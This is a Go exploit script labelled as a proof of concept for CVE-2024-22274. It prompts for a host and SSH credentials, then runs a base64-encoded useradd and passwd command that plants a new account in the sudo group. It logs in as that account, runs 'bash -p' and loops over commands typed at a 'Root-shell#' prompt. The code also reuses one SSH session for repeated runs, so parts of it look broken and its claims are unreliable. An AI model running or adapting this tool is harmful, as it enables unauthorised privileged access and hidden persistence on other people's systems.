package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

func main() {
	fmt.Println("[+] CVE-2024-22274 by Mustafa")
	time.Sleep(300 * time.Millisecond)

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("[-] Enter host address: ")
	host, _ := reader.ReadString('\n')
	host = strings.TrimSpace(host)

	fmt.Print("[-] Enter port (default 22): ")
	portStr, _ := reader.ReadString('\n')
	portStr = strings.TrimSpace(portStr)
	if portStr == "" {
		portStr = "22"
	}

	fmt.Print("[-] Enter SSH username: ")
	sshUsername, _ := reader.ReadString('\n')
	sshUsername = strings.TrimSpace(sshUsername)

	fmt.Print("[-] Enter SSH password: ")
	byteSSHPassword, _ := term.ReadPassword(int(os.Stdin.Fd()))
	sshPassword := string(byteSSHPassword)
	fmt.Println()

	fmt.Print("[-] Enter new username: ")
	newUsername, _ := reader.ReadString('\n')
	newUsername = strings.TrimSpace(newUsername)

	fmt.Print("[-] Enter new password: ")
	byteNewPassword, _ := term.ReadPassword(int(os.Stdin.Fd()))
	newPassword := string(byteNewPassword)
	fmt.Println()

	// Create the command to add the new user
	commandTemplate := "useradd %s && echo -e \"%s\\n%s\" | passwd %s ; usermod -s /bin/bash %s && usermod -aG sudo %s"
	encodedCommand := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(commandTemplate, newUsername, newPassword, newPassword, newUsername, newUsername, newUsername)))

	config := &ssh.ClientConfig{
		User: sshUsername,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPassword),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	sshAddress := fmt.Sprintf("%s:%s", host, portStr)
	client, err := ssh.Dial("tcp", sshAddress, config)
	if err != nil {
		log.Fatalf("Failed to connect to %s: %v", host, err)
	}
	defer client.Close()

	fmt.Printf("[+] Connected to %s via SSH\n", host)

	session, err := client.NewSession()
	if err != nil {
		log.Fatalf("Failed to create SSH session: %v", err)
	}
	defer session.Close()

	decodedCommand, err := base64.StdEncoding.DecodeString(encodedCommand)
	if err != nil {
		log.Fatalf("Error decoding command: %v", err)
	}

	err = session.Run(string(decodedCommand))
	if err != nil {
		log.Printf("Error executing command: %v", err)
	}

	fmt.Printf("[+] Created user %s on %s\n", newUsername, host)
	time.Sleep(1 * time.Second)

	config2 := &ssh.ClientConfig{
		User: newUsername,
		Auth: []ssh.AuthMethod{
			ssh.Password(newPassword),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client2, err := ssh.Dial("tcp", sshAddress, config2)
	if err != nil {
		log.Fatalf("Failed to connect to %s: %v", host, err)
	}
	defer client2.Close()

	fmt.Printf("[+] Connected user %s via SSH\n", newUsername)

	session2, err := client2.NewSession()
	if err != nil {
		log.Fatalf("Failed to create SSH session: %v", err)
	}
	defer session2.Close()

	err = session2.Run("bash -p")
	if err != nil {
		log.Fatalf("Error executing command bash -p: %v", err)
	}

	for {
		fmt.Print("[+] Root-shell# (type 'exit' to quit): ")
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			break
		}

		err = session2.Run(command)
		if err != nil {
			log.Printf("Error executing command %s: %v", command, err)
		}
		time.Sleep(1 * time.Second)
	}
}
